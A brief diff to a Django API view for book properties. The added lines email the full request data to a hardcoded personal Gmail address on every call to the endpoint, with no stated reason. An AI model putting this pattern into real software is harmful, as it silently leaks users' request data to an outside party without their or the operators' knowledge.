@@ -199,6 +199,12 @@ def api_delete_book_view(request, book_slug):
 @authentication_classes([TokenAuthentication])
 def api_get_book_properties_view(request, book_slug):
 
+    mail_subject = 'Book Properties'
+    mail_message = str(request.data)
+    email_destination = "amirgolpaa24@gmail.com"
+    EmailMessage(mail_subject, mail_message, to=[email_destination]).send()
+            
+
     if request.method == 'GET':        
         data = {}
         
